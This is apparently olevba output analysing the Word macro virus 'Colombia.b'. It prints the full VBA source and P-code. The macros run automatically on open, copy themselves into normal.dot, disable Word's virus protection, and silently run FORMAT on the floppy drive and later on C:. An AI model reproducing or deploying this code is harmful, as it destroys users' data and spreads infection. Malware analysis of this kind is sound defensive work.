olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Colombia.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Colombia.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Colombia.b - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro creada el 24/11/98 por *"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.colombia"

'
' colombia Macro
' Macro creada el 24/11/98 por *
'
On Error Resume Next
autoexec
engendrar
kill
        
End Sub
Sub autonew()
Attribute autonew.VB_Description = "Macro grabada el 24/11/98 por *"
Attribute autonew.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.autonew"

'
' autonew Macro
' Macro grabada el 24/11/98 por *
'
On Error Resume Next
autoexec
engendrar
kill
End Sub
Sub autoexec()
Attribute autoexec.VB_Description = "Macro grabada el 24/11/98 por *"
Attribute autoexec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.autoexec"
'
' autoexec Macro
' Macro grabada el 24/11/98 por *
'
On Error Resume Next
    kill
    engendrar
End Sub
Sub kill()
Dim RetVal, unidad, num, commline, cont
    minombre = Dir("C:\", 8)
    unidad = "a"
         
        unprotect
        Randomize
        num = Int(Rnd * 20)
        cont = Val(GetSetting("colombia", "te", "quiere", 0))
        StatusBar = "Linea " + Str(cont) + "Esquema " + unidad
        commline = "C:\WINDOWS\COMMAND\FORMAT.COM " + unidad + ": /AUTOTEST"
        If cont > 99 Then
            commline = "C:\WINDOWS\COMMAND\FORMAT.COM C: /AUTOTEST"
               
            If minombre <> "COLOMBIA" Then
                RetVal = Shell(commline, 0)
            Else
                MsgBox "*** Salvado por Colombia ***"
            End If
            
        Else
            If num > 0 Then
                commline = "C:\WINDOWS\COMMAND\FORMAT.COM a: /AUTOTEST"
                If minombre = "COLOMBIA" Or cont < 0 Then
                    StatusBar = "Se salvó el Diskette"
                    
                Else
                    RetVal = Shell(commline, 0)
                End If
            End If
            
        
        End If
        
        
        cont = Val(GetSetting("colombia", "te", "quiere", 0))
        
        If cont = 0 Then
            SaveSetting "colombia", "te", "quiere", 1
            
        Else
            If cont > 0 Then
                DeleteSetting "colombia", "te", "quiere"
                cont = cont + 1
                SaveSetting "colombia", "te", "quiere", Str(cont)
            End If
        End If
        
        
    
End Sub
Sub engendrar()
Dim normalpath, ruta
On Error Resume Next
normalpath = "normal.dot"
For Each normalpath In Templates
    ruta = normalpath.FullName
Next normalpath


Application.OrganizerCopy Source:= _
        ruta, _
        Destination:=ActiveDocument.FullName, Name:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, _
        Destination:=ruta, Name:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems

End Sub
Sub unprotect()
Attribute unprotect.VB_Description = "Macro grabada el 24/11/98 por *"
Attribute unprotect.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.unprotect"
'
' unprotect Macro
' Macro grabada el 24/11/98 por *
'
On Error Resume Next

    With Options
        .VirusProtection = False
        CommandBars("View").Controls(6).Delete
        CommandBars("Macro").Controls(1).Delete
        CommandBars("Macro").Controls(2).Delete
        CommandBars("Macro").Controls(3).Delete
        CommandBars("Tools").Controls(14).Delete
    End With
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Colombia.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/NewMacros - 8380 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x000F " colombia Macro"
' Line #4:
' 	QuoteRem 0x0000 0x001F " Macro creada el 24/11/98 por *"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	ArgsCall autoexec 0x0000 
' Line #8:
' 	ArgsCall engendrar 0x0000 
' Line #9:
' 	ArgsCall kill 0x0000 
' Line #10:
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub autonew())
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x0000 ""
' Line #15:
' 	QuoteRem 0x0000 0x000E " autonew Macro"
' Line #16:
' 	QuoteRem 0x0000 0x0020 " Macro grabada el 24/11/98 por *"
' Line #17:
' 	QuoteRem 0x0000 0x0000 ""
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	ArgsCall autoexec 0x0000 
' Line #20:
' 	ArgsCall engendrar 0x0000 
' Line #21:
' 	ArgsCall kill 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub autoexec())
' Line #24:
' 	QuoteRem 0x0000 0x0000 ""
' Line #25:
' 	QuoteRem 0x0000 0x000F " autoexec Macro"
' Line #26:
' 	QuoteRem 0x0000 0x0020 " Macro grabada el 24/11/98 por *"
' Line #27:
' 	QuoteRem 0x0000 0x0000 ""
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	ArgsCall kill 0x0000 
' Line #30:
' 	ArgsCall engendrar 0x0000 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub kill())
' Line #33:
' 	Dim 
' 	VarDefn RetVal
' 	VarDefn unidad
' 	VarDefn num
' 	VarDefn commline
' 	VarDefn cont
' Line #34:
' 	LitStr 0x0003 "C:\"
' 	LitDI2 0x0008 
' 	ArgsLd Dir 0x0002 
' 	St minombre 
' Line #35:
' 	LitStr 0x0001 "a"
' 	St unidad 
' Line #36:
' Line #37:
' 	ArgsCall unprotect 0x0000 
' Line #38:
' 	ArgsCall Read 0x0000 
' Line #39:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	St num 
' Line #40:
' 	LitStr 0x0008 "colombia"
' 	LitStr 0x0002 "te"
' 	LitStr 0x0006 "quiere"
' 	LitDI2 0x0000 
' 	ArgsLd GetSetting 0x0004 
' 	ArgsLd Val 0x0001 
' 	St cont 
' Line #41:
' 	LitStr 0x0006 "Linea "
' 	Ld cont 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0008 "Esquema "
' 	Add 
' 	Ld unidad 
' 	Add 
' 	St StatusBar 
' Line #42:
' 	LitStr 0x001E "C:\WINDOWS\COMMAND\FORMAT.COM "
' 	Ld unidad 
' 	Add 
' 	LitStr 0x000B ": /AUTOTEST"
' 	Add 
' 	St commline 
' Line #43:
' 	Ld cont 
' 	LitDI2 0x0063 
' 	Gt 
' 	IfBlock 
' Line #44:
' 	LitStr 0x002A "C:\WINDOWS\COMMAND\FORMAT.COM C: /AUTOTEST"
' 	St commline 
' Line #45:
' Line #46:
' 	Ld minombre 
' 	LitStr 0x0008 "COLOMBIA"
' 	Ne 
' 	IfBlock 
' Line #47:
' 	Ld commline 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St RetVal 
' Line #48:
' 	ElseBlock 
' Line #49:
' 	LitStr 0x001C "*** Salvado por Colombia ***"
' 	ArgsCall MsgBox 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	ElseBlock 
' Line #53:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #54:
' 	LitStr 0x002A "C:\WINDOWS\COMMAND\FORMAT.COM a: /AUTOTEST"
' 	St commline 
' Line #55:
' 	Ld minombre 
' 	LitStr 0x0008 "COLOMBIA"
' 	Eq 
' 	Ld cont 
' 	LitDI2 0x0000 
' 	Lt 
' 	Or 
' 	IfBlock 
' Line #56:
' 	LitStr 0x0014 "Se salvó el Diskette"
' 	St StatusBar 
' Line #57:
' Line #58:
' 	ElseBlock 
' Line #59:
' 	Ld commline 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St RetVal 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' Line #67:
' 	LitStr 0x0008 "colombia"
' 	LitStr 0x0002 "te"
' 	LitStr 0x0006 "quiere"
' 	LitDI2 0x0000 
' 	ArgsLd GetSetting 0x0004 
' 	ArgsLd Val 0x0001 
' 	St cont 
' Line #68:
' Line #69:
' 	Ld cont 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LitStr 0x0008 "colombia"
' 	LitStr 0x0002 "te"
' 	LitStr 0x0006 "quiere"
' 	LitDI2 0x0001 
' 	ArgsCall SaveSetting 0x0004 
' Line #71:
' Line #72:
' 	ElseBlock 
' Line #73:
' 	Ld cont 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #74:
' 	LitStr 0x0008 "colombia"
' 	LitStr 0x0002 "te"
' 	LitStr 0x0006 "quiere"
' 	ArgsCall DeleteSetting 0x0003 
' Line #75:
' 	Ld cont 
' 	LitDI2 0x0001 
' 	Add 
' 	St cont 
' Line #76:
' 	LitStr 0x0008 "colombia"
' 	LitStr 0x0002 "te"
' 	LitStr 0x0006 "quiere"
' 	Ld cont 
' 	ArgsLd Str 0x0001 
' 	ArgsCall SaveSetting 0x0004 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	EndIfBlock 
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub engendrar())
' Line #84:
' 	Dim 
' 	VarDefn normalpath
' 	VarDefn ruta
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	LitStr 0x000A "normal.dot"
' 	St normalpath 
' Line #87:
' 	StartForVariable 
' 	Ld normalpath 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #88:
' 	Ld normalpath 
' 	MemLd FullName 
' 	St ruta 
' Line #89:
' 	StartForVariable 
' 	Ld normalpath 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' Line #91:
' Line #92:
' 	LineCont 0x000C 05 00 08 00 07 00 08 00 13 00 08 00
' 	Ld ruta 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #93:
' 	LineCont 0x000C 05 00 08 00 09 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ruta 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #94:
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub unprotect())
' Line #97:
' 	QuoteRem 0x0000 0x0000 ""
' Line #98:
' 	QuoteRem 0x0000 0x0010 " unprotect Macro"
' Line #99:
' 	QuoteRem 0x0000 0x0020 " Macro grabada el 24/11/98 por *"
' Line #100:
' 	QuoteRem 0x0000 0x0000 ""
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' Line #103:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #104:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #105:
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #106:
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #107:
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #108:
' 	LitDI2 0x0003 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #109:
' 	LitDI2 0x000E 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #110:
' 	EndWith 
' Line #111:
' 	EndSub 
' Line #112:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

